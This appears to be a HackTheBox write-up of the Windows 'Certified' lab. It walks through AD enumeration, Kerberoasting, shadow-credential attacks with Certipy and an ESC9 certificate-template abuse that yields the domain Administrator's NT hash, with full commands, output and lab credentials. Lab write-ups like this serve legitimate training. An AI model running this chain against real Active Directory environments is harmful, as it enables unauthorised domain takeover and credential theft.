---
title: "Certified"
date: 2026-03-06
draft: false
description: "HackTheBox Certified writeup"
tags: ["hackthebox", "htb", "windows", "medium", "oscp"]
categories: ["CTF Writeups"]
showTableOfContents: true
showReadingTime: true
showWordCount: true
---

# Certified

## Overview

- **OS:** Windows
- **IP:** 10.129.231.186
- **Difficulty:** Medium
- **Platform:** HackTheBox
- **OSCP:** Yes
- **Lists:** N/A

### Summary

got into management_svc by abusing writerowner and genericall, and then exploited ESC9 vuln.

## Loot

| Loot |  |
| --- | --- |
| **Category** | **Details** |
| Usernames |  judith.mader  |
| Passwords | judith09 |
| Usernames+Passwords | Username: judith.mader Password: judith09 |
| Hashes |  |
| Service Versions |  |

## Enumeration

Username: judith.mader Password: judith09

## Nmap

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-06 12:34 EST
Nmap scan report for 10.129.231.186
Host is up (0.11s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        (generic dns response: SERVFAIL)
| fingerprint-strings: 
|   DNS-SD-TCP: 
|     _services
|     _dns-sd
|     _udp
|_    local
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-07 00:35:07Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
|_ssl-date: 2026-03-07T00:36:36+00:00; +7h00m01s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-03-07T00:36:35+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
|_ssl-date: 2026-03-07T00:36:35+00:00; +7h00m01s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.95%I=7%D=3/6%Time=69AB1059%P=x86_64-pc-linux-gnu%r(DNS-S
SF:D-TCP,30,"\0\.\0\0\x80\x82\0\x01\0\0\0\0\0\0\t_services\x07_dns-sd\x04_
SF:udp\x05local\0\0\x0c\0\x01");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-03-07T00:35:56
|_  start_date: N/A
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 139/tcp)
HOP RTT       ADDRESS
1   114.93 ms 10.10.14.1
2   115.38 ms 10.129.231.186

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.61 seconds
```

## Roasting

I validated this step using the evidence below before moving forward in the chain.

```
                                                                                                                                         
SMB         10.129.231.186  445    DC01             [+] certified.htb\judith.mader:judith09 
SMB         10.129.231.186  445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                 
SMB         10.129.231.186  445    DC01             Administrator                 2024-05-13 14:53:16 0       Built-in account for administering the computer/domain                                                                                                                                                    
SMB         10.129.231.186  445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain                                                                                                                                                  
SMB         10.129.231.186  445    DC01             krbtgt                        2024-05-13 15:02:51 0       Key Distribution Center Service Account 
SMB         10.129.231.186  445    DC01             judith.mader                  2024-05-14 19:22:11 0        
SMB         10.129.231.186  445    DC01             management_svc                2024-05-13 15:30:51 0        
SMB         10.129.231.186  445    DC01             ca_operator                   2024-05-13 15:32:03 0        
SMB         10.129.231.186  445    DC01             alexander.huges               2024-05-14 16:39:08 0        
SMB         10.129.231.186  445    DC01             harry.wilson                  2024-05-14 16:39:37 0        
SMB         10.129.231.186  445    DC01             gregory.cameron               2024-05-14 16:40:05 0        
SMB         10.129.231.186  445    DC01             [*] Enumerated 9 local users: CERTIFIED
```

lets try kerberoasting

```
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName               Name            MemberOf                                    PasswordLastSet             LastLogon  Delegation 
---------------------------------  --------------  ------------------------------------------  --------------------------  ---------  ----------
certified.htb/management_svc.DC01  management_svc  CN=Management,CN=Users,DC=certified,DC=htb  2024-05-13 11:30:51.476756  <never>               

[-] CCache file is not found. Skipping...
$krb5tgs$23$*management_svc$CERTIFIED.HTB$certified.htb/management_svc*$287b2c4e4872bb1c70618d14029a15bd$32c66e46e2c772bbdca57022cf8a818c7b8025714d1ac794319b23136ef7c980e95e1210eef94fc669ac84490fffcb7d2a7f62f1ade005bad90f38b40e87ead8c7f9d967b483ce5aa26e9d1997e43c1ba4e2e06005525fefd314c44893932d5ec7039c6a26a8c4f5fb5e463679d08e25660f27ecc9510f444078414b8d45cea90cc1fbf3dc8b54e516f96cbe4663402a316e6310754c687289d27fc8542a822b8343834ec4e8bb07d86e647460931a0e229427d2ddbf5f999b42a789c815e7a47857b420fabe2fc88d4abc5ec8baac5d3d81043b8a23f6948e22a5eb83d12d5ab2857581e6ab778e7013d35589c67a14da3ee269cca7b2c1ceed08e846e790ef8c0360a48ab9bfffff7face191787a4092d387d109617072e1df4c0b467ff8d57fe7727ec60ab8023b34e92eb1c4f8c09ec953bab0e5ca6a1f8b37fa05ababd6d15580b4bbd89f80f418c2aabde7979118db2cc871bada0effe7bb9680303e08e0c3009936e3dca9617fc75f723e38a703c5a792866a2bad2ad884b8926b55c23b24585d14d052a54ec1b39e3740a0251890f628cb0b5c62dcccef39f7437cac9b80efa8529cdd2b97c4d809278ca6034c943c8eb15228e81ceace9d97c9af09879f5e980960b0859a92d5ea74ee3630c0476f75d7fb4522f297f4abdc614e4b0386570926d8e325b132b27fb60dcc6b8660006fb503bfdbbff3c00f0d366ba940c800c1eab52aaf677d01dbb50c5965ae424c31c64a7476b7cfc23463eead3e92e2aebc7b1b1c99b20abf266072565b940d0553f86023edbd3ae6d8d49ae6a4eb939ab40bd76df40a88e69686ae96e0e307285bdfaa4ad99b366966a0183f69381e81f1445441a67aad12ad496d25cafed726e9006976f5ef3841cf4572acc5f1eba18e8157b40993fb1bc8b5253c4b2d59925f3b7480034fa0a2af7c24b2ac3a34dcd581c5570a9b9dc75c6531710293bef2e5e172edc8748eb0aeebecd132b33714f1ab8aebf59583b3f946e3be78d06a08e9e0405bb02e4f6cbfd51261bbe75c1cc01342ae7546253aff23c40319d69b4e852ac643666185d2f82f4015835d3ca8d5c8604cdd7dca9eee0e706915571a4d3c0a2cc54a4ee4f73c88763fafe90661626c22d25a6aa6a82f0e773dcde45f06ffb6ed94c3832a873983f053e63f84177d4ce2c8771ced26c0f36c485bd48142209977bf106e90d77f92521159f8ff5d5bf68649b058818599a6ff0d9d1d4a4f95fda90c81b1988fc10e5e641682f48b8c51f3401e4ab8b2d302f49936eb1a4081cabdb7ab242bcb73af28397f424f6f42be60b578cf130e825e3f2f8ba64b7b09f8e5a1b24164b3cea221c18ff03305f98965e4f5f5b45e82b995a9138206fd6afe43be1a53c1474f0b0f28a9d21fd0037d8a7dbc9c3efef8498a9a6023693cb6100375fa39e60cf8690b326191587485a162ea3f483c44d2c1c345b2fc6e931df98d9b27f1fe32122f002d21c8989a09e1cdb7499f1759169fb2a27111c55d1e776bc86404588f1960a71b588dea43614bd811387977cb0fca63c4aa3ca93913707a91d3ed7e
                                                                                                                                                     
```

lets crack this

cant seem to crack it

{{< figure src="image 544.png" >}}

lets check for cred reuse

and nothing there either

## Exploitation

{{< figure src="image 545.png" >}}

alright so judith has writeowner over this user lets abuse it



{{< figure src="image 546.png" >}}

ok so the path is clear, we add ourselves to the group and then grab management_svc

`

{{< figure src="image 547.png" >}}

great now we can go forth

```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'management_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '0097fa33-afa9-37f8-d31b-18340254044d'
[*] Adding Key Credential with device ID '0097fa33-afa9-37f8-d31b-18340254044d' to the Key Credentials for 'management_svc'
[*] Successfully added Key Credential with device ID '0097fa33-afa9-37f8-d31b-18340254044d' to the Key Credentials for 'management_svc'
/home/kali/.local/lib/python3.13/site-packages/certipy/lib/certificate.py:233: CryptographyDeprecationWarning: Parsed a serial number which wasn't positive (i.e., it was negative or zero), which is disallowed by RFC 5280. Loading this certificate will cause an exception in a future release of cryptography.
  return x509.load_der_x509_certificate(certificate)
[*] Authenticating as 'management_svc' with the certificate
[*] Using principal: management_svc@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'management_svc.ccache'
[*] Trying to retrieve NT hash for 'management_svc'
[*] Restoring the old Key Credentials for 'management_svc'
[*] Successfully restored the old Key Credentials for 'management_svc'
[*] NT hash for 'management_svc': a091c1832bcdd4677c28b5a6a1295584
```

we got the nt hash for management wee

i ahve generic all over ca operator

{{< figure src="image 548.png" >}}

lets abuse this aswell

```
─(kali㉿kali)-[~/Desktop/Boxes/Certified]
└─$ certipy shadow auto -username management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -account ca_operator -target certified.htb -dc-ip 10.129.231.186
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_operator'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '735e05fe-c1c8-f829-69a9-ac18e2df0b13'
[*] Adding Key Credential with device ID '735e05fe-c1c8-f829-69a9-ac18e2df0b13' to the Key Credentials for 'ca_operator'
[*] Successfully added Key Credential with device ID '735e05fe-c1c8-f829-69a9-ac18e2df0b13' to the Key Credentials for 'ca_operator'
/home/kali/.local/lib/python3.13/site-packages/certipy/lib/certificate.py:233: CryptographyDeprecationWarning: Parsed a serial number which wasn't positive (i.e., it was negative or zero), which is disallowed by RFC 5280. Loading this certificate will cause an exception in a future release of cryptography.
  return x509.load_der_x509_certificate(certificate)
[*] Authenticating as 'ca_operator' with the certificate
[*] Using principal: ca_operator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_operator.ccache'
[*] Trying to retrieve NT hash for 'ca_operator'
[*] Restoring the old Key Credentials for 'ca_operator'
[*] Successfully restored the old Key Credentials for 'ca_operator'
[*] NT hash for 'ca_operator': b4b86f45c6018f1b664f70805f45d8f2
                                                                        
```

and we have this boom

```
┌──(kali㉿kali)-[~/Desktop/Boxes/Certified]
└─$ certipy-ad  account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator -dc-ip 10.129.231.186
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : Administrator
[*] Successfully updated 'ca_operator'
                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop/Boxes/Certified]
└─$ certipy req -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.129.231.186
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error: The NETBIOS connection with the remote host timed out.
[-] Use -debug to print a stacktrace
                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop/Boxes/Certified]
└─$ certipy-ad req -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.129.231.186
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 6
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop/Boxes/Certified]
└─$ certipy account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb -dc-ip 10.129.231.186 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : ca_operator@certified.htb
[*] Successfully updated 'ca_operator'
                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop/Boxes/Certified]
└─$ certipy auth -pfx administrator.pfx -dc-ip 10.129.231.186 -domain certified.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
```
